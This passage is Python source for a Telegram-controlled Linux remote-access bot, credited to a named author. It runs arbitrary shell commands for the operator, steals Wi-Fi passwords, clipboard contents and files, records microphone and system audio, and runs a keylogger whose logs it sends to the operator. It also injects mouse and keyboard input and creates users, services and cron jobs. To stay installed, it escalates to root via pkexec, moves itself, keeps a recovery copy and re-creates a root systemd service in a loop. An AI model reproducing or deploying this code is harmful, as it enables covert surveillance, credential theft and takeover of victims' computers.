                        send(f'TOKEN is changed ({TOKEN}) --> ({value}) [+]')
                    case 'PASSWORD':
                        write_file(CONFIG_PASSWORD, encrypt(value))
                        send(f'PASSWORD is changed ({PASSWORD}) --> ({value}) [+]')
                    case 'SEED':
                        if not value.isdigit():
                            send('(SEED) is invalid')
                            return
                        
                        write_file(CONFIG_SEED, value)
                        send(f'SEED is changed ({SEED}) --> ({value}) [+]')
                        
                return
            elif exp := parse_cmd(r'-r\s*(?P<const>TOKEN|PASSWORD|SEED)', args):
                match exp['const']:
                    case 'TOKEN':
                        if os.path.isfile(CONFIG_TOKEN):
                            os.remove(CONFIG_TOKEN)
                            send('reset (TOKEN) [+]')
                    case 'PASSWORD':
                        if os.path.isfile(CONFIG_PASSWORD):
                            os.remove(CONFIG_PASSWORD)
                            send('reset (PASSWORD) [+]')
                    case 'SEED':
                        if os.path.isfile(CONFIG_SEED):
                            os.remove(CONFIG_SEED)
                            send('reset (SEED) [+]')

                return
        case 'account':
            if args == '-g':
                accounts = []

                for n in os.listdir(PATH_MEM):
                    try:
                        name, date = decrypt(read_file(os.path.join(PATH_MEM, n))).split('=')
                        accounts.append([((int(n) ^ KEY[1]) >> KEY[0]), f'@{name}', date])
                    except:
                        continue
                
                send(tabulate(accounts, headers=[('ID'), ('NAME'), ('CONNECTION-DATE')], tablefmt='grid'), doc='account.txt') if accounts else send('no accounts [*]')
                return
            elif exp := parse_cmd(r'-d\s*(?P<id>\d+)', args):
                session_id = int(exp['id'])
                path_id = os.path.join(PATH_MEM, mem_id(session_id))
                
                if os.path.exists(path_id):
                    os.remove(path_id)
                    send(f'account is deleted ({session_id}) [+]')
                else:
                    send(f'failed to delete account ({session_id}) [-]')

                return
        case 'autostart':
            if args == '-l':
                try:
                    autostart_files = decrypt(read_file(FILE_AUTOSTART)).splitlines()
                except:
                    send('no files in bot autostart [*]')
                    return

                bfiles = []
                
                for line in autostart_files:
                    try:
                        bname, bpath, bargs, bdate = line.split('\u200B')
                        bfiles.append([bname, bpath, bargs, bdate])
                    except:
                        continue

                send(tabulate(bfiles, headers=[('NAME'), ('PATH'), ('ARGUMENTS'), ('DATE')], tablefmt='grid'), doc='autostart.txt') if bfiles else send('no files in bot autostart [*]')
                return
            elif exp := parse_cmd(r'-c\s*(?P<name>.*?)\s*-p\s*(?P<path>.*?)\s*-a\s*(?P<args>.+)', args):
                bname, bpath, bargs, date = exp['name'], exp['path'], exp['args'], get_date()

                bpath = os.path.abspath(bpath) if os.path.isfile(bpath) else os.path.join(PATH_SHARE, bpath)
  
                if not os.path.isfile(bpath):
                    send(f'file does not exist ({os.path.split(bpath)[-1]}) [*]')
                    return
 
                if not os.path.isfile(FILE_AUTOSTART):
                    write_file(FILE_AUTOSTART, '')

                send(f'added file ({bname}) in bot autostart [+]' if change_file(FILE_AUTOSTART, bname, f'{bname}\u200B{bpath}\u200B{bargs}\u200B{date[0]} | {date[1]}', enc=True) else f'failed to add file ({bname}) in bot autostart [-]')
                return  
            elif exp := parse_cmd(r'-d\s*(?P<name>.+)', args):
                bname = exp['name']
                
                send(f'deleted file from bot autostart ({bname}) [+]' if change_file(FILE_AUTOSTART, bname, bname, delete=True, enc=True) else f'file does not exist ({bname}) in bot autostart [*]') if os.path.isfile(FILE_AUTOSTART) else send('no files in bot autostart [*]')
                return
            elif args == '-r':
                if os.path.isfile(FILE_AUTOSTART):
                    write_file(FILE_AUTOSTART, '')
                    send('bot autostart is reset [+]')
                else:
                    send('no files in bot autostart [*]')

                return
        case 'cd':
            if os.path.isdir(args):
                os.chdir(args)
                send(f'directory changed ({args}) [+]\n\nCURRENT DIRECTORY: {os.getcwd()}')
            else:
                send(f'directory does not exist ({args}) [*]')

            return
        case 'mkfile':
            if exp := parse_cmd(r'(?P<path>.*?)\s*-d\s*(?P<data>.+)', args):
                path = exp['path']

                try:
                    write_file(path, exp['data'].replace('\\t', '\t').replace('\\n', '\n'))
                except:
                    send(f'failed to create file ({path}) [-]')
                else:
                    send(f'file is created ({path}) [+]')

                return
        case 'mkdir':
            try:
                mkdir(args)
            except:
                send(f'failed to create dir ({args}) [-]')
            else:
                send(f'dir is created ({args}) [+]')
            
            return
        case 'rn':           
            if exp := parse_cmd(r'(?P<name>.*?)\s*-n\s*(?P<new_name>.+)', args):
                current_name, new_name = exp['name'], exp['new_name']

                path = os.path.split(os.path.abspath(current_name))[0]

                if os.path.exists(current_name):
                    try:
                        os.rename(current_name, os.path.join(path, new_name))
                    except:
                        send(f'failed to rename path ({current_name}) [-]')
                    else:
                        send(f'path is renamed ({current_name}) --> ({new_name}) [+]')
                else:
                    send(f'path does not exist ({current_name}) [*]')

                return
        case 'rm':
            if os.path.isfile(args):
                try:
                    os.remove(args)
                except:
                    send(f'failed to delete file ({args}) [-]')
                else:
                    send(f'file is deleted ({args}) [+]')
            else:
                send(f'file does not exist ({args}) [*]')

            return
        case 'rmdir':
            if os.path.isdir(args):
                try:
                    shutil.rmtree(args)
                except:
                    send(f'failed to delete dir ({args}) [-]')
                else:
                    send(f'dir is deleted ({args}) [+]')
            else:
                send(f'dir does not exist ({args}) [*]')
            
            return
        case 'cp':        
            if exp := parse_cmd(r'(?P<from_path>.*?)\s*-t\s*(?P<to_path>.+)', args):
                from_path, to_path = exp['from_path'], exp['to_path']

                if os.path.exists(from_path):
                    try:
                        (shutil.copy if os.path.isfile(from_path) else shutil.copytree)(from_path, to_path)
                    except:
                        send(f'failed to copy path ({from_path}) [-]')
                    else:
                        send(f'path is copied ({from_path}) --> ({to_path}) [+]')
                else:
                    send(f'path does not exist ({from_path}) [*]')

                return
        case 'mv':           
            if exp := parse_cmd(r'(?P<from_path>.*?)\s*-t\s*(?P<to_path>.+)', args):
                from_path, to_path = exp['from_path'], exp['to_path']

                if os.path.exists(from_path):
                    try:
                        shutil.move(from_path, to_path)
                    except:
                        send(f'failed to move path ({from_path}) [-]')
                    else:
                        send(f'path is moved ({from_path}) --> ({to_path}) [+]')
                else:
                    send(f'path does not exist ({from_path}) [*]')

                return
        case 'chmod':
            if exp := parse_cmd(r'(?P<path>.*?)\s*-m\s*(?P<mode>\d+)', args):
                mpath, cmode = exp['path'], int(exp['mode'], base=8)

                if not os.path.exists(mpath):
                    send(f'path does not exist ({mpath})')
                    return

                try:
                    os.chmod(mpath, cmode)
                except:
                    send(f'failed to change path mode ({mpath})')
                else:
                    send(f'changed path mode ({mpath}) --> ({cmode})')
                
                return
        case 'hide':
            if os.path.exists(args):
                send(f'path is hidden ({args}) [+]' if hide(args) else f'failed to hide path ({args}) [-]')
            else:
                send(f'path does not exist ({args}) [*]')
            
            return
        case 'unhide':
            if os.path.exists(args):
                send(f'path is unhidden ({args}) [+]' if unhide(args) else f'failed to unhide path ({args}) [-]')
            else:
                send(f'path does not exist ({args}) [*]')
            
            return
        case 'cat':
            if os.path.isfile(args):
                try:
                    file_data = read_file(args, b=True)
                    send(file_data, doc=os.path.split(args)[-1]) if file_data else send(f'file is empty ({args}) [*]')
                except:
                    send(f'failed to download file ({args}) [-]')
            else:
                send(f'file does not exist ({args}) [*]')

            return
        case 'inet':
            if args == '-e':
                shell('nmcli networking on')
                return
            elif args == '-d':
                shell('nmcli networking off')
                return
        case 'wifi':
            if args == '-g':
                wifi_list = wifi()

                send(tabulate(wifi_list, headers=[('SSID'), ('BSSID'), ('CHANNEL'), ('RATE'), ('MODE'), ('SECURITY'), ('SIGNAL')], tablefmt='grid'), doc='wifi.txt') if wifi_list else send(NULL)
                return
            elif args == '-p':
                wifi_password_list = wifi_password()

                send(tabulate(wifi_password_list, headers=[('SSID'), ('PASSWORD')], tablefmt='grid'), doc='wifi_password.txt') if wifi_password_list else send(NULL)
                return
        case 'site':           
            if exp := parse_cmd(r'-p\s*(?P<url>.+)', args):
                url = exp['url']

                try:
                    open_site(url)
                except:
                    send(f'failed to open website ({url}) [-]')
                else:
                    send(f'website is opened ({url}) [+]')
                
                return
            elif exp := parse_cmd(r'-d\s*(?P<url>.*?)\s*-n\s*(?P<name>.+)', args):
                url, name = exp['url'], exp['name']

                query_http = http(url)

                if query_http is None:
                    send(f'failed to query website ({url}) [*]')
                    return

                try:
                    write_file(os.path.join(PATH_SHARE, name), query_http)
                except:
                    send(f'failed to download from website ({url}) [-]')
                else:
                    send(f'file is downloaded from website ({url}) --> ({name}) [+]')

                return
            elif args == '-l':
                if os.path.isfile(FILE_HOSTS):
                    bsites = []

                    for line in read_file(FILE_HOSTS).splitlines():
                        n = line.split()

                        if (len(n) > 4) and (n[2] == '#'):
                            bsites.append([n[1], f'{n[-1]} | {n[-2]}'])

                    send(tabulate(bsites, headers=[('DOMAIN'), ('DATE')], tablefmt='grid'), doc='blocked_sites.txt') if bsites else send('no blocked sites [*]')
                else:
                    send('no blocked sites [*]')

                return  
            elif exp := parse_cmd(r'-b\s*(?P<domain>.+)', args):
                domain, date = exp['domain'], get_date()

                try:
                    verify_domain(domain)
                except:
                    send(f'domain does not exist ({domain}) [*]')
                    return

                if not os.path.isfile(FILE_HOSTS):
                    write_file(FILE_HOSTS, '')

                send(f'site is blocked ({domain}) [+]' if change_file(FILE_HOSTS, domain, f'127.0.0.1       {domain} # {date[0]} {date[1]}') else f'failed to block site ({domain}) [-]')
                return
            elif exp := parse_cmd(r'-d\s*(?P<domain>.+)', args):
                domain = exp['domain']

                send(f'site is unblocked ({domain}) [+]' if change_file(FILE_HOSTS, domain, domain, delete=True) else f'site does not exist ({domain}) [*]') if os.path.isfile(FILE_HOSTS) else send('no blocked sites [*]')
                return
            elif args == '-r':
                if os.path.isfile(FILE_HOSTS):
                    write_file(FILE_HOSTS, '')
                    send('sites is unblocked [+]')
                else:
                    send('no blocked sites [*]')
                    
                return
        case 'modprobe':
            if args == '-g':
                modprobe_list = modprobe('get')

                send(tabulate(modprobe_list, headers=[('NAME'), ('SIZE'), ('USED'), ('MODULE')], tablefmt='grid'), doc='modprobe.txt') if modprobe_list else send(NULL)
                return
            elif exp := parse_cmd(r'(?P<mode>-i|-d)\s*(?P<name>.+)', args):
                mmode, mmodule = 'installed' if exp['mode'] == '-i' else 'deleted', exp['name']

                send(f'modprobe module is {mmode} ({mmodule}) [+]' if modprobe(mmode, mmodule) else f'failed to {mmode} modprobe module ({mmodule}) [-]')
                return
        case 'service':
            if args == '-g':
                systemctl_str = systemctl('get')

                send(systemctl_str, doc='service.txt') if systemctl_str else send(NULL)
                return
            elif exp := parse_cmd(r'-q\s*(?P<name>.+)', args):
                name = exp['name']

                service = systemctl('query', name)

                send(service, doc='service.txt') if service else send(f'service does not exist ({name}) [*]')
                return
            elif args == '-u':
                send('service is updated [+]' if systemctl('update') else 'failed to update service [-]')
                return      
            elif exp := parse_cmd(r'-c\s*(?P<name>.*?)\s*-d\s*(?P<description>.*?)\s*-p\s*(?P<path>.*?)\s*-a\s*(?P<args>.*?)\s*-u\s*(?P<user>root|user)', args):
                send(systemctl(
                    'create',
                    name=exp['name'], 
                    description=exp['description'], 
                    path=exp['path'], 
                    args=exp['args'], 
                    root=exp['user'] == 'root'
                ))
                return
            elif exp := parse_cmd(r'(?P<mode>-d|-e|-i|-l|-r|-s)\s*(?P<name>.+)', args):
                name = exp['name']

                match exp['mode']:
                    case '-d':
                        send(systemctl('delete', name))
                    case '-e':
                        send(systemctl('enable', name))
                    case '-i':
                        send(systemctl('disable', name))
                    case '-l':
                        send(systemctl('start', name))
                    case '-r':
                        send(systemctl('restart', name))
                    case '-s':
                        send(systemctl('stop', name))
                    
                return
        case 'crontab':
            if args == '-g':
                crontab_list = crontab('get')

                send(tabulate(crontab_list, headers=[('NAME'), ('TASK')], tablefmt='grid'), doc='crontab.txt') if crontab_list else send('crontab is empty [*]')
                return
            elif exp := parse_cmd(r'-c\s*(?P<name>.*?)\s*-e\s*(?P<event>.*?)\s*-u\s*(?P<user>root|user)\s*-p\s*(?P<path>.*?)\s*-a\s*(?P<args>.+)', args):
                send(crontab(
                    'create',
                    name=exp['name'],
                    event=exp['event'],
                    root=exp['user'] == 'root',
                    path=exp['path'],
                    args=exp['args']
                ))
                return
            elif exp := parse_cmd(r'-d\s*(?P<name>.+)', args):
                send(crontab('delete', exp['name']))
                return 
        case 'startup':
            if args == '-g':
                startup_str = startup('get')

                send(startup_str if startup_str else 'startup is empty [*]')
                return 
            elif exp := parse_cmd(r'-c\s*(?P<name>.*?)\s*-p\s*(?P<path>.*?)\s*-a\s*(?P<args>.+)', args):
                send(startup(
                    'create', 
                    name=exp['name'],
                    path=exp['path'],
                    args=exp['args']
                    ))
                return
            elif exp := parse_cmd(r'(?P<mode>-d|-l)\s*(?P<name>.+)', args):
                send(startup('delete' if exp['mode'] == '-d' else 'start', exp['name']))
                return
        case 'env':
            if args == '-g':
                env_str = env('get')

                send(env_str, doc='environment.txt') if env_str else send(NULL)
                return
            elif exp := parse_cmd(r'-q\s*(?P<key>.+)', args):
                ekey = exp['key']

                env_str = env('query', ekey) 

                send(env_str) if env_str else send(f'environment key does not exist ({ekey}) [*]')
                return
            elif exp := parse_cmd(r'-c\s*(?P<key>.*?)\s*-v\s*(?P<value>.+)', args):
                send(env('create', exp['key'], exp['value']))
                return
            elif exp := parse_cmd(r'-d\s*(?P<key>.+)', args):
                send(env('delete', exp['key']))
                return
        case 'user':
            if args == '-g':
                user_str = user('get')

                send(user_str, doc='user.txt') if user_str else send(NULL)
                return
            elif exp := parse_cmd(r'-q\s*(?P<name>.+)', args):
                name = exp['name']

                user_str = user('get', name)

                send(user_str) if user_str else send(f'user does not exist ({name}) [*]')
                return
            elif exp := parse_cmd(r'-c\s*(?P<name>.*?)\s*-p\s*(?P<password>.+)', args):
                uname, upassword = exp['name'], exp['password']

                send(user('create', uname, upassword))
                return 
            elif exp := parse_cmd(r'-d\s*(?P<name>.*?)', args):
                send(user('delete', exp['name']))
                return 
        case 'block':
            if args == '-l':
                try:
                    blocked_apps = decrypt(read_file(FILE_APP_BLOCKER)).splitlines()
                except:
                    send('no blocked apps [*]')
                    return
                
                bapps = []
                
                for line in blocked_apps:
                    n = line.split('=')

                    if len(n) == 2:
                        bapps.append([n[0], n[1]])
                
                send(tabulate(bapps, headers=[('NAME'), ('DATE')], tablefmt='grid'), doc='blocked_apps.txt') if bapps else send('no blocked apps [*]')
                return
            elif exp := parse_cmd(r'-b\s*(?P<name>.+)', args):
                name, date = exp['name'], get_date()

                if not os.path.isfile(FILE_APP_BLOCKER):
                    write_file(FILE_APP_BLOCKER, '')

                send(f'app is blocked ({name}) [+]' if change_file(FILE_APP_BLOCKER, name, f'{name}={date[0]} | {date[1]}', enc=True) else f'failed to block app ({name}) [-]')
                return
            elif exp := parse_cmd(r'-d\s*(?P<name>.+)', args):
                name = exp['name']

                send(f'app is unblocked ({name}) [+]' if change_file(FILE_APP_BLOCKER, name, name, delete=True, enc=True) else f'app does not exist ({name}) [*]') if os.path.isfile(FILE_APP_BLOCKER) else send('no blocked apps [*]')
                return
            elif args == '-r':
                if os.path.isfile(FILE_APP_BLOCKER):
                    write_file(FILE_APP_BLOCKER, '')
                    send('apps is unblocked [+]')
                else:
                    send('no blocked apps [*]')

                return
        case 'kill':
            send(f'killed ({args}) [+]' if kill(args) else f'failed to kill ({args}) [-]')
            return
        case 'run':
            if exp := parse_cmd(r'(?P<path>.*?)\s*-a\s*(?P<args>.+)', args):
                file_path, file_args = exp['path'], exp['args']

                start_file = launch(file_path, '' if file_args == 'none' else file_args)

                if start_file is None:
                    send(f'path does not exist ({file_path}) [*]')
                else:
                    send(f'ran file ({args}) [+]' if start_file else f'failed to run file ({args}) [-]') 

                return
        case 'cmd':
            if exp := parse_cmd(r'(?P<output>-e|-g)\s*(?P<command>.+)', args):
                output, command = exp['output'] == '-g', exp['command']

                if not output:
                    send(f'cmd command is executed ({command}) [+]' if shell(command) else f'failed to execute cmd command ({command}) [-]')
                else:
                    exec_cmd = shell(command, output=True)
                    send(exec_cmd, doc='cmd.txt') if exec_cmd else send(f'command not found ({command}) in cmd [*]')

                return
        case 'time':
            if args == '-g':
                send(get_date()[0])
                return
            elif exp := parse_cmd(r'-s\s*(?P<time>.+)', args):
                time_ = exp['time']

                send(f'time is changed ({time_}) [+]' if shell(f'date +%T -s "{time_}"') else f'time is invalid ({time_}) [-]') 
                return
        case 'date':
            if args == '-g':
                send(get_date()[1])
                return
            elif exp := parse_cmd(r'-s\s*(?P<date>.+)', args):
                date = exp['date']

                send(f'date is changed ({date}) [+]' if shell(f'date +%F -s "{date}"') else f'date is invalid ({date}) [-]')
                return       
        case 'mouse':
            if args == '-p':
                x, y = mouse.get_position()

                send(f'mouse position ({x}x{y})')
                return
            elif exp := parse_cmd(r'-x\s*(?P<x>\d+)\s*-y\s*(?P<y>\d+)\s*-d\s*(?P<delay>\d+)', args):
                x, y, delay = int(exp['x']), int(exp['y']), int(exp['delay'])

                mouse.move(x, y, duration=delay)
                send(f'mouse is moved ({x}x{y}) [+]')
                return
            elif exp := parse_cmd(r'(?P<button>-l|-r|-m)\s*-c\s*(?P<click>\d+)\s*-d\s*(?P<delay>\d+)', args):
                click, delay, button = int(exp['click']), int(exp['delay']), exp['button']

                match button:
                    case '-l':
                        button = 'left'
                        mbutton = mouse.LEFT
                    case '-r':
                        button = 'right'
                        mbutton = mouse.RIGHT
                    case '-m':
                        button = 'middle'
                        mbutton = mouse.MIDDLE
                            
                for _ in range(click):
                    mouse.press(mbutton)
                    sleep(delay)
                    mouse.release(mbutton)

                send(f'mouse button ({button}) is clicked ({click}) [+]')
                return
            elif exp := parse_cmd(r'-s\s*(?P<amount>-*\d+)', args):
                amount = int(exp['amount'])

                mouse.wheel(amount)
                send(f'mouse is scrolled ({amount}) [+]')
                return
        case 'keyboard':
            if exp := parse_cmd(r'-t\s*(?P<text>.*?)\s*-d\s*(?P<delay>\d+)', args):
                text, delay = exp['text'], int(exp['delay'])

                kb.write(text, delay)
                send(f'keyboard wrote ({text}) [+]')
                return
            elif exp := parse_cmd(r'-k\s*(?P<key>.*?)\s*-p\s*(?P<amount>\d+)\s*-d\s*(?P<delay>\d+)', args):
                key, amount, delay = exp['key'], int(exp['amount']), int(exp['delay'])

                for _ in range(amount):
                    try:
                        kb.press(key)
                        sleep(delay)
                        kb.release(key)
                    except:
                        send(f'keyboard key is invalid ({key}) [-]')
                        return

                send(f'keyboard key ({key}) is pressed ({amount}) [+]')
                return
            elif exp := parse_cmd(r'-c\s*(?P<type>-k|-h)\s*(?P<key>.*?)\s*-n\s*(?P<new_key>.+)', args):
                key_type, key, new_key = exp['type'], exp['key'], exp['new_key']

                try:
                    (kb.remap_key if key_type == '-k' else kb.remap_hotkey)(key, new_key)
                except:
                    send('failed to remap keyboard ' + ('key' if key_type == '-k' else 'hotkey') + f' ({key}) [-]')
                else:
                    send('remapped keyboard ' + ('key' if key_type == '-k' else 'hotkey') + f' ({key}) --> ({new_key}) [+]')

                return
            elif exp := parse_cmd(r'-b\s*(?P<key>.+)', args):
                key = exp['key']

                try:
                    kb.block_key(key)
                except:
                    send(f'failed to block keyboard key ({key}) [-]')
                else:
                    send(f'keyboard key is blocked ({key}) [+]')

                return
            elif args == '-r':
                kb.unhook_all()
                send(f'keyboard keys is unblocked [+]')
                return  
        case 'clipboard':
            if args == '-g':
                clipboard_data = cb.paste()
                send(clipboard_data, doc='clipboard.txt') if clipboard_data else send('clipboard is empty [*]')
                return
            elif exp := parse_cmd(r'-c\s*(?P<data>.+)', args):
                cb.copy(exp['data'])
                send('copied to clipboard [+]')
                return
            elif args == '-r':
                cb.copy('')
                send(f'clipboard is cleared [+]')
                return
        case 'audio':
            if exp := parse_cmd(r'(?P<type>-m|-p)\s*(?P<second>\d+)', args):
                rtype, second = 'system' if exp['type'] == '-p' else 'microphone', int(exp['second'])

                if second > 600:
                    send(f'maximum sound limit is 600 seconds [*]')
                    return
                
                send(f'audio start record {rtype} ({second}s) [*]')
                mp3 = audio(rtype, second)

                send('failed to record audio [-]') if mp3 is None else send(mp3, doc='audio.mp3')
                return
            elif exp := parse_cmd(r'-s\s*(?P<path>.+)', args):
                audio_path = exp['path']

                if os.path.isfile(audio_path):
                    try:
                        shell(f'ffplay -nodisp -autoexit -loglevel quiet "{audio_path}"')
                        send(f'audio is playing ({audio_path}) [*]')
                    except:
                        send(f'failed to play audio ({audio_path}) [-]')
                    else:
                        send(f'audio is played ({audio_path}) [+]')
                else:
                    send(f'audio does not exist ({audio_path}) [*]')

                return
        case 'msg':
            if exp := parse_cmd(r'(?P<type>-p|-s)\s*(?P<title>.*?)\s*-t\s*(?P<text>.+)', args):
                msg_type, title, text = exp['type'], exp['title'].replace('\\t', '\t').replace('\\n', '\n'), exp['text'].replace('\\t', '\t').replace('\\n', '\n')
                
                if msg_type == '-p':      
                    shell(f'notify-send -u critical "{title}" "{text}"')
                    send('msg push [+]')
                else:
                    shell(f'xmessage -geometry 400x200 -title "{title}" "{text}"')
                    send('msg system [+]')
                    
                return
        case 'keylogger':
            if exp := parse_cmd(r'-g\s*(?P<mode>base|char|hotkey|no hotkey)', args):
                if os.path.isfile(FILE_KEYLOGGER):
                    try:
                        data = keylogger_parser(exp['mode']).getvalue()

                        send(data, doc='keylogger.txt') if data else send('keylogger data is empty [*]')
                    except:
                        send('failed to get keylogger data [-]')
                else:
                    send('keylogger is disabled [*]')
                
                return

            match args:
                case '-e':
                    write_file(FILE_KEYLOGGER_FLAG, '1')
                    send('keylogger is enabled [+]')
                    return
                case '-d':
                    write_file(FILE_KEYLOGGER_FLAG, '0')
                    send('keylogger is disabled [+]')
                    return
                case '-s':
                    send('keylogger is enabled [+]' if os.path.isfile(FILE_KEYLOGGER_FLAG) and (read_file(FILE_KEYLOGGER_FLAG) == '1') else 'keylogger is disabled [-]')
                    return   
                case '-r':
                    if os.path.isfile(FILE_KEYLOGGER):
                        write_file(FILE_KEYLOGGER, '')
                        send('keylogger data is reset [+]')
                    else:
                        send('keylogger is disabled [*]')

                    return

    send(f'command not found ({cmd})')


def get_root():
    if os.geteuid() == 0:
        return

    if not os.path.isfile(PATH_BASH):
        raise PermissionError('root rights are required to execute')

    Process(target=lambda: shell(f'{PATH_BASH} -c "{PATH_PKEXEC} \'{py_path}\' \'{__file__}\'"')).start()
    os._exit(0)


def install_lib(name):
    if find_spec(name) is None:
        shell(f'"{FILE_PIP}" install "{name}"', timeout=60) 
    

def init_libs():
    global TeleBot, ApiException
    from telebot import TeleBot
    from telebot.apihelper import ApiException 

    global psutil
    try:
        import psutil
    except:
        psutil = None

    global mouse
    try:
        import mouse
    except:
        mouse = None

    global kb
    try:
        import keyboard as kb
    except:
        kb = None

    global cb
    try:
        import pyperclip as cb
    except:
        cb = None

    global mss
    try:
        from mss import mss
    except:
        mss = None

    global ffmpeg
    try:
        import ffmpeg
    except:
        ffmpeg = None

    global http_get
    try:
        from requests import get as http_get
    except:
        http_get = None

    global detect
    try:
        from chardet import detect
    except:
        detect = None

    global tabulate
    try:
        from tabulate import tabulate
    except:
        tabulate = None
    

def init_bot_exe():
    if not os.path.isfile(BOT_FILE_PATH) and os.path.isfile(__file__):
        shutil.move(__file__, BOT_FILE_PATH)

    while True:
        mkdir([
            PATH,
            PATH_MEM,
            PATH_SYS, 
            PATH_CONFIG,
            PATH_TMP,
            PATH_SHARE
        ])
        
        if not os.path.isfile(BOT_FILE_PATH_RECOVERY) and os.path.isfile(BOT_FILE_PATH):
            shutil.copy(BOT_FILE_PATH, BOT_FILE_PATH_RECOVERY)
        
        if not os.path.isfile(BOT_FILE_PATH) and os.path.isfile(BOT_FILE_PATH_RECOVERY):
            shutil.copy(BOT_FILE_PATH_RECOVERY, BOT_FILE_PATH)

        if not os.path.isfile(FILE_INIT):
            write_file(FILE_INIT, f'#!{PATH_BASH}\nexec "{FILE_PYTHON}" "{BOT_FILE_PATH}"')
            os.chmod(FILE_INIT, 0o755)   

        systemctl(
            'create',
            name=BOT_SERVICE_NAME,
            description=BOT_SERVICE_DESCRIPTION,
            path=FILE_INIT,
            root=True,
            _reload=False
        )

        sleep(3)

    
def setup():
    global LOGGED_USER, PATH_CONFIG_STARTUP

    _run_user = NULL
    LOGGED_USER = NULL

    for _uid in os.listdir('/run/user'):
        if not _uid.isdigit() or (_uid == '0'):
            continue

        try:
            LOGGED_USER = getpwuid(int(_uid)).pw_name
            _run_user = f'/run/user/{_uid}'
        except:
            continue
        else:
            break

    PATH_CONFIG_STARTUP = f'/home/{LOGGED_USER}/.config/autostart'

    _xauth = f'/home/{LOGGED_USER}/.Xauthority'

    if not os.path.isfile(_xauth) and os.path.isdir(_run_user):
        for n in os.listdir(_run_user):
            if 'waylandauth' in n:
                _xauth = os.path.abspath(n)
                break

    os.putenv('DISPLAY', ':0')
    os.putenv('XAUTHORITY', _xauth)

    mkdir([
        PATH,
        PATH_MEM,
        PATH_SYS, 
        PATH_CONFIG,
        PATH_TMP,
        PATH_SHARE
    ])
   
    if not os.path.isdir(PATH_VENV):
        shell(f'"{py_path}" -m venv "{PATH_VENV}"')

    for n in LIBS:
        install_lib(n)

    try:
        init_libs()
    except ImportError:
        if not os.path.isfile(FILE_FLIB):
            write_file(FILE_FLIB, '')
            os.execv(FILE_PYTHON, [FILE_PYTHON, __file__])
        else:
            os.remove(FILE_FLIB)
            raise SystemError('failed to install libraries')
    else:    
        if os.path.isfile(FILE_FLIB):
            os.remove(FILE_FLIB)

    if BOT_EXE:
        Thread(target=init_bot_exe).start()


def init():
    invalid_type('TOKEN', TOKEN, str)
    invalid_type('PASSWORD', PASSWORD, str)
    invalid_type('SEED', SEED, int)
    invalid_type('PATH', PATH, str)

    if len(TOKEN) != 46:
        raise ValueError('Telegram bot (TOKEN) is invalid')
    
    if not PASSWORD:
        raise ValueError('(PASSWORD) is empty')
    
    try:
        decrypt(encrypt(' \t\n\u200B\u200F\u20600123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZабвгдеёжзийклмнопрстуфхцчшщыэюяАБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЫЭЮЯЄєЇїІіҐґ'))
    except:
        raise ValueError('(SEED) is invalid')
    
    if not os.path.isdir(os.path.split(PATH)[0]):
        raise ValueError('(PATH) is invalid')
    
    get_root()
        
    setup()
    Thread(target=autostart).start()
    Thread(target=app_blocker).start()
    Thread(target=keylogger).start()


def bot():
    tg = TeleBot(
        TOKEN,
        validate_token=True,
        disable_web_page_preview=True,
        protect_content=True,
        threaded=True,
        num_threads=3,
        suppress_middleware_excepions=True
    )

    try:
        tg.get_me()
    except ApiException:
        raise SystemExit('(TOKEN) is invalid or unauthorized')

    session_date = get_date()
    session = f'''
GitHub: https://github.com/cppandpython
AUTHOR: Vladislav Khudash
VERSION: linux

HOST: {NODE + "\\\\" + USER} 
PLATFORM: {OS["platform"]} {OS["release"]}
DATE: {session_date[0]} | {session_date[1]}
'''
    

    def send(chat_id, data, doc=''):
        if not doc:
            tg.send_message(chat_id, data) 
        else:
            if isinstance(data, str):
                data = data.encode()

            tg.send_document(chat_id, data, visible_file_name=doc)


    def verify_user(chat_id, user_id, user_name, password, date):
        path_user = os.path.join(PATH_MEM, mem_id(user_id))

        if os.path.isfile(path_user): 
            return True
        
        if password == PASSWORD:
            send(chat_id, session)
            write_file(path_user, encrypt(f'{user_name}={date[0]} | {date[1]}'))
            return True
        else:
            send(chat_id, 'Enter password to connect to session [*]')
            return False


    @tg.message_handler(content_types=['text'])
    def executor(msg):
        chat_id = msg.chat.id 
        user_id = msg.from_user.id 
        user_name = msg.from_user.username
        cmd = msg.text.strip()

        if not verify_user(chat_id, user_id, user_name, cmd, session_date) or (cmd == PASSWORD):
            return
        elif cmd == 'session':
            send(chat_id, session)
            return
        elif cmd == 'exit':
            session_id = mem_id(user_id)
            mem_user = os.path.join(PATH_MEM, session_id)

            if os.path.isfile(mem_user):
                os.remove(mem_user)
                send(chat_id, f'session is left ({session_id}) [+]')
            else:
                send(chat_id, f'your account is not verified ({user_id}) [*]')
            
            return
        
        send_execute = lambda data, doc='': send(chat_id, data, doc)

        try:
            execute(cmd, send_execute)
        except BaseException as error:
            send(chat_id, f'{type(error).__name__}({error})')

    
    @tg.message_handler(content_types=['document'])
    def upload(file): 
        chat_id = file.chat.id 
        user_id = file.from_user.id 
        doc_id = file.document.file_id
        doc_name = file.document.file_name

        if not verify_user(chat_id, user_id, '', '', ''):
            return

        try:
            write_file(os.path.join(PATH_SHARE, doc_name), tg.download_file(tg.get_file(doc_id).file_path))
        except:
            send(chat_id, f'failed to upload file {doc_name}) [-]')
        else:
            send(chat_id, f'file is uploaded ({doc_name}) [+]')


    tg.infinity_polling(
        skip_pending=True,
        allowed_updates=['message'],
        timeout=30, 
        long_polling_timeout=30
    )


def main():
    init()

    while True:
        try:
            bot()
        except SystemExit as error:
            raise ValueError(error)
        except:
            sleep(10)
    

if __name__ == '__main__': main()